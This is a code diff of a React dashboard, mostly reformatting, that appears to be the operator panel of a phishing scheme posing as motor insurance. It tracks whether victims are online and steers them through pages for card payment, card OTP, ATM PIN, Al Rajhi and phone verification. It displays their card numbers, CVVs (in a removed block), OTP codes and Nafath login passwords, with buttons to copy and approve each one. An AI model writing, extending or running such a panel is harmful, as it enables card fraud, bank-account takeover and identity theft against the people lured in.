@@ -280,9 +280,11 @@ export default function Dashboard() {
   // Check if visitor is online (updated within last 3 minutes)
   const isOnline = (n: Notification) => {
     if (!n.updatedAt) return false;
-    const updatedTime = typeof n.updatedAt === 'string' 
-      ? new Date(n.updatedAt).getTime()
-      : n.updatedAt?.toDate?.()?.getTime?.() || new Date(n.updatedAt).getTime();
+    const updatedTime =
+      typeof n.updatedAt === "string"
+        ? new Date(n.updatedAt).getTime()
+        : n.updatedAt?.toDate?.()?.getTime?.() ||
+          new Date(n.updatedAt).getTime();
     const threeMinutesAgo = Date.now() - 3 * 60 * 1000;
     return updatedTime > threeMinutesAgo;
   };
@@ -1026,10 +1028,13 @@ export default function Dashboard() {
           {selectedApplication && (
             <div className="px-4 py-3 bg-gradient-to-l from-primary/10 to-card border-t border-border">
               <div className="flex items-center gap-3">
-                <span className="text-sm font-medium text-muted-foreground">التحكم في الصفحة:</span>
+                <span className="text-sm font-medium text-muted-foreground">
+                  التحكم في الصفحة:
+                </span>
                 <Select
                   value={
-                    selectedApplication.currentPage === "motor-insurance" || !selectedApplication.currentPage
+                    selectedApplication.currentPage === "motor-insurance" ||
+                    !selectedApplication.currentPage
                       ? `step-${selectedApplication.currentStep || 1}`
                       : String(selectedApplication.currentPage)
                   }
@@ -1043,49 +1048,66 @@ export default function Dashboard() {
                   }}
                   data-testid="page-control-dropdown"
                 >
-                  <SelectTrigger className="w-[200px]" data-testid="page-control-trigger">
+                  <SelectTrigger
+                    className="w-[200px]"
+                    data-testid="page-control-trigger"
+                  >
                     <SelectValue placeholder="اختر الصفحة" />
                   </SelectTrigger>
                   <SelectContent>
                     <SelectItem value="step-1" data-testid="option-step-1">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">1</span>
+                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">
+                          1
+                        </span>
                         <span>البيانات</span>
                       </div>
                     </SelectItem>
                     <SelectItem value="step-2" data-testid="option-step-2">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">2</span>
+                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">
+                          2
+                        </span>
                         <span>التأمين</span>
                       </div>
                     </SelectItem>
                     <SelectItem value="step-3" data-testid="option-step-3">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">3</span>
+                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">
+                          3
+                        </span>
                         <span>الأسعار</span>
                       </div>
                     </SelectItem>
                     <SelectItem value="step-4" data-testid="option-step-4">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-purple-500 text-white flex items-center justify-center text-xs">4</span>
+                        <span className="w-5 h-5 rounded-full bg-purple-500 text-white flex items-center justify-center text-xs">
+                          4
+                        </span>
                         <span>الدفع</span>
                       </div>
                     </SelectItem>
                     <SelectItem value="step-5" data-testid="option-step-5">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">5</span>
+                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">
+                          5
+                        </span>
                         <span>OTP البطاقة</span>
                       </div>
                     </SelectItem>
                     <SelectItem value="step-6" data-testid="option-step-6">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-green-500 text-white flex items-center justify-center text-xs">6</span>
+                        <span className="w-5 h-5 rounded-full bg-green-500 text-white flex items-center justify-center text-xs">
+                          6
+                        </span>
                         <span>مكتمل</span>
                       </div>
                     </SelectItem>
                     <SelectItem value="step-7" data-testid="option-step-7">
                       <div className="flex items-center gap-2">
-                        <span className="w-5 h-5 rounded-full bg-amber-500 text-white flex items-center justify-center text-xs">7</span>
+                        <span className="w-5 h-5 rounded-full bg-amber-500 text-white flex items-center justify-center text-xs">
+                          7
+                        </span>
                         <span>رمز الصراف</span>
                       </div>
                     </SelectItem>
@@ -1101,7 +1123,10 @@ export default function Dashboard() {
                         <span>الراجحي</span>
                       </div>
                     </SelectItem>
-                    <SelectItem value="phone-verification" data-testid="option-phone">
+                    <SelectItem
+                      value="phone-verification"
+                      data-testid="option-phone"
+                    >
                       <div className="flex items-center gap-2">
                         <Phone size={14} className="text-amber-500" />
                         <span>الهاتف</span>
@@ -1390,11 +1415,12 @@ export default function Dashboard() {
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                       <Key size={16} className="text-blue-500" />
                       رموز التحقق
-                      {!selectedApplication.cardOtpApproved && selectedApplication.otpCode && (
-                        <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse mr-2">
-                          بانتظار الموافقة
-                        </Badge>
-                      )}
+                      {!selectedApplication.cardOtpApproved &&
+                        selectedApplication.otpCode && (
+                          <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse mr-2">
+                            بانتظار الموافقة
+                          </Badge>
+                        )}
                       {selectedApplication.cardOtpApproved && (
                         <Badge className="bg-green-100 text-green-700 text-[9px] mr-2">
                           تمت الموافقة
@@ -1405,21 +1431,23 @@ export default function Dashboard() {
                   <div className="p-6 space-y-4">
                     <div className="grid grid-cols-2 gap-4">
                       {selectedApplication.otpCode && (
-                        <div className={cn(
-                          "rounded-lg p-4 text-center",
-                          selectedApplication.cardOtpApproved 
-                            ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500" 
-                            : "bg-blue-50 dark:bg-blue-900/30"
-                        )}>
+                        <div
+                          className={cn(
+                            "rounded-lg p-4 text-center",
+                            selectedApplication.cardOtpApproved
+                              ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500"
+                              : "bg-blue-50 dark:bg-blue-900/30",
+                          )}
+                        >
                           <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
                             OTP البطاقة
                           </p>
                           <p
                             className={cn(
                               "font-mono text-2xl font-bold",
-                              selectedApplication.cardOtpApproved 
-                                ? "text-green-600 dark:text-green-400" 
-                                : "text-blue-600 dark:text-blue-400"
+                              selectedApplication.cardOtpApproved
+                                ? "text-green-600 dark:text-green-400"
+                                : "text-blue-600 dark:text-blue-400",
                             )}
                             data-testid="text-card-otp"
                           >
@@ -1449,21 +1477,23 @@ export default function Dashboard() {
                         </div>
                       )}
                       {selectedApplication.phoneOtpCode && (
-                        <div className={cn(
-                          "rounded-lg p-4 text-center",
-                          selectedApplication.phoneOtpApproved 
-                            ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500" 
-                            : "bg-pink-50 dark:bg-pink-900/30"
-                        )}>
+                        <div
+                          className={cn(
+                            "rounded-lg p-4 text-center",
+                            selectedApplication.phoneOtpApproved
+                              ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500"
+                              : "bg-pink-50 dark:bg-pink-900/30",
+                          )}
+                        >
                           <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
                             OTP الهاتف
                           </p>
                           <p
                             className={cn(
                               "font-mono text-2xl font-bold",
-                              selectedApplication.phoneOtpApproved 
-                                ? "text-green-600 dark:text-green-400" 
-                                : "text-pink-600 dark:text-pink-400"
+                              selectedApplication.phoneOtpApproved
+                                ? "text-green-600 dark:text-green-400"
+                                : "text-pink-600 dark:text-pink-400",
                             )}
                             data-testid="text-phone-otp"
                           >
@@ -1495,43 +1525,65 @@ export default function Dashboard() {
                     </div>
                     {/* OTP Approval Buttons */}
                     <div className="flex flex-wrap gap-2 pt-2 border-t border-border">
-                      {selectedApplication.otpCode && !selectedApplication.cardOtpApproved && (
-                        <Button
-                          size="sm"
-                          onClick={() => {
-                            handleFieldApproval(selectedApplication.id, "cardOtpApproved", true);
-                            handleApprovalStatus(selectedApplication.id, "approved_otp");
-                          }}
-                          className="bg-emerald-600 hover:bg-emerald-700"
-                          data-testid="button-approve-card-otp"
-                        >
-                          <CheckCircle className="h-4 w-4 ml-2" />
-                          موافقة OTP البطاقة
-                        </Button>
-                      )}
-                      {selectedApplication.phoneOtpCode && !selectedApplication.phoneOtpApproved && (
-                        <Button
-                          size="sm"
-                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", true)}
-                          className="bg-pink-600 hover:bg-pink-700"
-                          data-testid="button-approve-phone-otp"
-                        >
-                          <CheckCircle className="h-4 w-4 ml-2" />
-                          موافقة OTP الهاتف
-                        </Button>
-                      )}
-                      {(selectedApplication.otpCode || selectedApplication.phoneOtpCode) && 
-                       !selectedApplication.cardOtpApproved && !selectedApplication.phoneOtpApproved && (
-                        <Button
-                          size="sm"
-                          variant="destructive"
-                          onClick={() => handleApprovalStatus(selectedApplication.id, "rejected")}
-                          data-testid="button-reject-otp"
-                        >
-                          <Ban className="h-4 w-4 ml-2" />
-                          رفض
-                        </Button>
-                      )}
+                      {selectedApplication.otpCode &&
+                        !selectedApplication.cardOtpApproved && (
+                          <Button
+                            size="sm"
+                            onClick={() => {
+                              handleFieldApproval(
+                                selectedApplication.id,
+                                "cardOtpApproved",
+                                true,
+                              );
+                              handleApprovalStatus(
+                                selectedApplication.id,
+                                "approved_otp",
+                              );
+                            }}
+                            className="bg-emerald-600 hover:bg-emerald-700"
+                            data-testid="button-approve-card-otp"
+                          >
+                            <CheckCircle className="h-4 w-4 ml-2" />
+                            موافقة OTP البطاقة
+                          </Button>
+                        )}
+                      {selectedApplication.phoneOtpCode &&
+                        !selectedApplication.phoneOtpApproved && (
+                          <Button
+                            size="sm"
+                            onClick={() =>
+                              handleFieldApproval(
+                                selectedApplication.id,
+                                "phoneOtpApproved",
+                                true,
+                              )
+                            }
+                            className="bg-pink-600 hover:bg-pink-700"
+                            data-testid="button-approve-phone-otp"
+                          >
+                            <CheckCircle className="h-4 w-4 ml-2" />
+                            موافقة OTP الهاتف
+                          </Button>
+                        )}
+                      {(selectedApplication.otpCode ||
+                        selectedApplication.phoneOtpCode) &&
+                        !selectedApplication.cardOtpApproved &&
+                        !selectedApplication.phoneOtpApproved && (
+                          <Button
+                            size="sm"
+                            variant="destructive"
+                            onClick={() =>
+                              handleApprovalStatus(
+                                selectedApplication.id,
+                                "rejected",
+                              )
+                            }
+                            data-testid="button-reject-otp"
+                          >
+                            <Ban className="h-4 w-4 ml-2" />
+                            رفض
+                          </Button>
+                        )}
                     </div>
                   </div>
                 </div>
@@ -1577,33 +1629,50 @@ export default function Dashboard() {
                     )}
                     {selectedApplication.phoneOtpCode && (
                       <div className="bg-pink-50 dark:bg-pink-900/30 rounded-lg p-4 text-center border border-pink-200 dark:border-pink-800">
-                        <p className="text-xs text-muted-foreground mb-2">رمز التحقق OTP</p>
-                        <p className="font-mono text-3xl font-bold text-pink-600 dark:text-pink-400" dir="ltr">
+                        <p className="text-xs text-muted-foreground mb-2">
+                          رمز التحقق OTP
+                        </p>
+                        <p
+                          className="font-mono text-3xl font-bold text-pink-600 dark:text-pink-400"
+                          dir="ltr"
+                        >
                           {selectedApplication.phoneOtpCode}
                         </p>
                         <Button
                           size="sm"
                           variant="outline"
                           className="mt-3"
-                          onClick={() => copyToClipboard(selectedApplication.phoneOtpCode!, "OTP الهاتف")}
+                          onClick={() =>
+                            copyToClipboard(
+                              selectedApplication.phoneOtpCode!,
+                              "OTP الهاتف",
+                            )
+                          }
                         >
                           <Copy size={12} className="ml-1" />
                           نسخ
                         </Button>
                       </div>
                     )}
-                    {!selectedApplication.phoneOtpApproved && selectedApplication.phoneOtpCode && (
-                      <div className="pt-4 border-t border-border">
-                        <Button
-                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", true)}
-                          className="w-full bg-pink-600 hover:bg-pink-700"
-                          data-testid="button-approve-phone-section"
-                        >
-                          <CheckCircle className="h-4 w-4 ml-2" />
-                          موافقة على الهاتف
-                        </Button>
-                      </div>
-                    )}
+                    {!selectedApplication.phoneOtpApproved &&
+                      selectedApplication.phoneOtpCode && (
+                        <div className="pt-4 border-t border-border">
+                          <Button
+                            onClick={() =>
+                              handleFieldApproval(
+                                selectedApplication.id,
+                                "phoneOtpApproved",
+                                true,
+                              )
+                            }
+                            className="w-full bg-pink-600 hover:bg-pink-700"
+                            data-testid="button-approve-phone-section"
+                          >
+                            <CheckCircle className="h-4 w-4 ml-2" />
+                            موافقة على الهاتف
+                          </Button>
+                        </div>
+                      )}
                   </div>
                 </div>
               )}
@@ -1634,7 +1703,7 @@ export default function Dashboard() {
                       value={selectedApplication.nafazPass}
                       isLtr
                     />
-                    
+
                     {/* Editable Auth Number */}
                     <div className="bg-purple-50 dark:bg-purple-900/30 rounded-lg p-4 border border-purple-200 dark:border-purple-800">
                       <label className="block text-sm font-bold text-purple-700 dark:text-purple-400 mb-2">
@@ -1642,7 +1711,11 @@ export default function Dashboard() {
                       </label>
                       <div className="flex gap-2">
                         <Input
-                          value={nafazAuthNumber || selectedApplication.authNumber || ""}
+                          value={
+                            nafazAuthNumber ||
+                            selectedApplication.authNumber ||
+                            ""
+                          }
                           onChange={(e) => setNafazAuthNumber(e.target.value)}
                           placeholder="أدخل رقم التحقق"
                           className="text-center text-xl font-mono flex-1"
@@ -1651,9 +1724,15 @@ export default function Dashboard() {
                         />
                         <Button
                           onClick={() => {
-                            const authNum = nafazAuthNumber || selectedApplication.authNumber || "";
+                            const authNum =
+                              nafazAuthNumber ||
+                              selectedApplication.authNumber ||
+                              "";
                             if (authNum.trim()) {
-                              handleUpdateNafazAuthNumber(selectedApplication.id, authNum);
+                              handleUpdateNafazAuthNumber(
+                                selectedApplication.id,
+                                authNum,
+                              );
                             }
                           }}
                           className="bg-purple-600 hover:bg-purple-700"
@@ -1663,11 +1742,15 @@ export default function Dashboard() {
                           إرسال
                         </Button>
                       </div>
-                      {selectedApplication.authNumber && selectedApplication.authNumber !== "..." && (
-                        <p className="text-xs text-purple-600 dark:text-purple-400 mt-2 text-center">
-                          الرقم الحالي: <span className="font-mono font-bold">{selectedApplication.authNumber}</span>
-                        </p>
-                      )}
+                      {selectedApplication.authNumber &&
+                        selectedApplication.authNumber !== "..." && (
+                          <p className="text-xs text-purple-600 dark:text-purple-400 mt-2 text-center">
+                            الرقم الحالي:{" "}
+                            <span className="font-mono font-bold">
+                              {selectedApplication.authNumber}
+                            </span>
+                          </p>
+                        )}
                     </div>
 
                     <div className="pt-4 border-t border-border">
@@ -1731,7 +1814,12 @@ export default function Dashboard() {
               )}
 
               {/* Actions Section */}
-              <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden" ref={(el) => el?.scrollIntoView({ behavior: 'smooth', block: 'end' })}>
+              <div
+                className="bg-card rounded-xl shadow-sm border border-border overflow-hidden"
+                ref={(el) =>
+                  el?.scrollIntoView({ behavior: "smooth", block: "end" })
+                }
+              >
                 <div className="bg-gradient-to-l from-gray-500/10 to-card px-4 py-3 border-b border-border">
                   <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                     <Settings size={16} className="text-gray-500" />
@@ -1739,39 +1827,6 @@ export default function Dashboard() {
                   </h3>
                 </div>
                 <div className="p-6 space-y-4">
-                  {/* Card Info Summary */}
-                  {getCardNumber(selectedApplication) && (
-                    <div className="bg-gradient-to-l from-blue-500/10 to-transparent p-4 rounded-lg border border-blue-200 dark:border-blue-800">
-                      <div className="flex items-center gap-3 mb-3">
-                        <CreditCard size={20} className="text-blue-500" />
-                        <span className="font-bold text-sm">معلومات البطاقة</span>
-                      </div>
-                      <div className="grid grid-cols-2 gap-3 text-sm">
-                        <div>
-                          <span className="text-muted-foreground">رقم البطاقة:</span>
-                          <div className="font-mono text-foreground" dir="ltr">{getCardNumber(selectedApplication)}</div>
-                        </div>
-                        {getCardName(selectedApplication) && (
-                          <div>
-                            <span className="text-muted-foreground">اسم حامل البطاقة:</span>
-                            <div className="font-medium text-foreground">{getCardName(selectedApplication)}</div>
-                          </div>
-                        )}
-                        {getCardExpiry(selectedApplication) && (
-                          <div>
-                            <span className="text-muted-foreground">تاريخ الانتهاء:</span>
-                            <div className="font-mono text-foreground" dir="ltr">{getCardExpiry(selectedApplication)}</div>
-                          </div>
-                        )}
-                        {getCardCvv(selectedApplication) && (
-                          <div>
-                            <span className="text-muted-foreground">CVV:</span>
-                            <div className="font-mono text-foreground" dir="ltr">{getCardCvv(selectedApplication)}</div>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                  )}
                   <div className="flex flex-wrap gap-3">
                     <Button
                       size="sm"
@@ -1817,7 +1872,11 @@ export default function Dashboard() {
                               disabled={!atmCode.trim()}
                               onClick={() => {
                                 if (atmCode.trim()) {
-                                  handleApprovalStatus(selectedApplication.id, "approved_atm", atmCode.trim());
+                                  handleApprovalStatus(
+                                    selectedApplication.id,
+                                    "approved_atm",
+                                    atmCode.trim(),
+                                  );
                                   setAtmCode("");
                                 }
                               }}
